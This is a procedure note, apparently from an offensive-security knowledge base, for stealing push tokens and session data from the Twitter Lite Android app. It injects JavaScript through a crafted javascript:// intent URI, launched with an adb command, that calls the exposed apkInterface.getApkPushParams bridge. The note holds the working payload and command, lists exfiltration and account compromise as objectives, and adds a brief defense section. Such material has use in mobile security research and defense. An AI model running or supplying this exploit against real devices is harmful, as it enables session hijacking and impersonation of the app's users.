---
tags:
  - android
  - token-theft
  - javascript-injection
type: procedure
tools:
  - '[[tools/ADB-Android-Debug-Bridge]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/adb-invoke-getapkpushparams-in-twitterlite]]'
verified: false
platforms:
  - Android
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Credentials In Files]]'
updated_at: '2025-12-14T17:24:34.611Z'
sub_techniques: []
id: a1852339-902d-4a9c-95b5-0add3937c8bb
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Credentials In Files]]'
---
# Invoke apkInterface.getApkPushParams for Token Theft via JavaScript Injection

## Summary

This procedure calls the exposed getApkPushParams method on apkInterface using injected JS to retrieve and display a JSON payload containing the app's push token, session data, and device info, enabling token theft.

## Description

The apkInterface provides methods to access app state. By invoking getApkPushParams via JS in the WebView, the attacker obtains sensitive push notification tokens and client details, which can be used for session hijacking or impersonation.

## Requirements

1. apkInterface discovered and accessible
2. ADB setup

## Defense

Defensive measures and detection strategies:

- Validate caller context in native methods (e.g., check if called from trusted JS)
- Encrypt or obfuscate sensitive data in JS interfaces
- Monitor for unauthorized method invocations in logs

## Objectives

1. Exfiltrate push tokens and session info
2. Achieve account compromise potential
3. Demonstrate JS bridge leakage

## Instructions

### Step 1: Craft Invocation Payload

**Context**: JS to call and write the method result.

Payload: javascript://google.com%0Ajavascript:document.write(apkInterface.getApkPushParams())%3B

### Step 2: Execute Method Call

**Context**: Inject to invoke and output.

**Command** ([[commands/adb-invoke-getapkpushparams-in-twitterlite]]):
```bash
adb shell am start -a "android.intent.action.VIEW" -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "javascript://google.com%0Ajavascript:document.write(apkInterface.getApkPushParams())%3B"
```

> JS calls the method and renders JSON.

**Expected Output**: JSON with token and device info.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[JavaScript]] JavaScript
- [[Credentials In Files]] Unsecured Credentials: Credentials In Files

### Sub-Techniques


## Commands Used

- [[commands/adb-invoke-getapkpushparams-in-twitterlite]]

## Tools Used

- [[tools/ADB-Android-Debug-Bridge]]

## Tags

- android
- token-theft
- javascript-injection
- webview
